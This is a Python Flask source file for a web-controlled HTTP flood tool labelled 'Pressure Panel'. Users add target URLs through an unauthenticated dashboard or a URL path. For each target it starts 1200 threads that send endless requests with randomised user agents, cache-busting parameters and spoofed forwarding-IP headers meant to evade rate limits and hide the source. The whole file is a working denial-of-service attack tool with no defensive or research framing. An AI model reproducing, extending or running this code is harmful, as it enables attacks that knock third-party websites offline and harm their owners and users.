from flask import Flask, jsonify, request, render_template_string
import requests
import threading
import urllib3
import time
import random
from fake_useragent import UserAgent

app = Flask(__name__)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
ua = UserAgent()

targets = []
stats = {"good": {}, "failed": 0}
lock = threading.Lock()
threads_per_url = 1200

def generate_headers():
    rand_ip = ".".join(str(random.randint(1, 255)) for _ in range(4))
    return {
        "User-Agent": ua.random,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "DNT": "1",
        "Referer": random.choice([
            "https://www.google.com/search?q=",
            "https://www.bing.com/search?q=",
            "https://search.yahoo.com/search?p=",
            "https://duckduckgo.com/?q=",
        ]),
        "X-Requested-With": "XMLHttpRequest",
        "X-Forwarded-For": rand_ip,
        "X-Real-IP": rand_ip,
        "Forwarded": f"for={rand_ip}",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
    }

def attack(url):
    while True:
        try:
            fake_params = f"?id={random.randint(1000,9999)}&t={time.time()}"
            full_url = url + fake_params
            headers = generate_headers()
            r = requests.get(full_url, headers=headers, verify=False, timeout=10)
            code = r.status_code
            with lock:
                key = f"{url} [{code}]"
                stats["good"].setdefault(key, 0)
                stats["good"][key] += 1
        except Exception:
            with lock:
                stats["failed"] += 1

def start_threads_for_url(url):
    for _ in range(threads_per_url):
        t = threading.Thread(target=attack, args=(url,))
        t.daemon = True
        t.start()

@app.route('/')
def dashboard():
    with lock:
        return render_template_string("""
            <html>
            <head>
                <title>Turbo HTTP Pressure</title>
                <style>
                    body { font-family: Arial, background-color: #111; color: #eee; padding: 40px; }
                    h1 { color: #00ff99; }
                    input, button { padding: 8px; border: none; border-radius: 5px; }
                    input[type=text] { width: 300px; }
                    button { background: #00ff99; color: #000; }
                    .target { margin: 8px 0; padding: 6px; background: #222; border-left: 4px solid #00ff99; }
                    .statbox { background: #222; padding: 10px; margin-top: 20px; border-radius: 8px; }
                    pre { background: #000; padding: 10px; border-radius: 5px; }
                    a { color: #00ffcc; text-decoration: none; }
                </style>
            </head>
            <body>
                <h1>Pressure Panel</h1>
                <h2>Current Targets:</h2>
                {% for t in targets %}
                    <div class="target">
                        {{ t }}
                        <form method="post" action="/remove" style="display:inline;">
                            <input type="hidden" name="url" value="{{ t }}">
                            <button type="submit">Remove</button>
                        </form>
                    </div>
                {% else %}
                    <p>No targets yet.</p>
                {% endfor %}

                <form method="post" action="/add">
                    <input type="text" name="url" placeholder="https://example.com">
                    <button type="submit">Add Target</button>
                </form>

                <div class="statbox">
                    <h2>Live Stats</h2>
                    <pre>{{ stats | tojson(indent=2) }}</pre>
                </div>
            </body>
            </html>
        """, targets=targets, stats=stats)

@app.route('/add', methods=['POST'])
def add():
    url = request.form.get("url")
    if not url: return "Invalid URL", 400
    if not url.startswith("http"): url = "https://" + url
    if url not in targets:
        targets.append(url)
        start_threads_for_url(url)
    return "<a href='/'>Back</a>"

@app.route('/remove', methods=['POST'])
def remove():
    url = request.form.get("url")
    if url in targets:
        targets.remove(url)
    return "<a href='/'>Back</a>"

@app.route('/target=<path:url>')
def add_by_path(url):
    url = url if url.startswith("http") else "https://" + url
    if url not in targets:
        targets.append(url)
        start_threads_for_url(url)
        return f"Started threads for {url} <a href='/'>Back</a>"
    return f"Already running. <a href='/'>Back</a>"

@app.route('/api')
def api():
    with lock:
        return jsonify(stats)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
